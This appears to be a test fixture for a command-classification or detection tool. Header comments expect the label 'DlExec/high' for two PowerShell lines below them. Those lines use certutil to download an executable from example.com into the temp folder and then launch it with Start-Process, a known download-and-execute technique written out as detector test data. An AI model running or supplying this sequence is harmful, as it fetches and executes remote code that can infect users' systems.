# expect: DlExec/high
# url: https://example.com/tool.exe
certutil -urlcache -split -f https://example.com/tool.exe "$env:TEMP\tool.exe"
Start-Process "$env:TEMP\tool.exe"
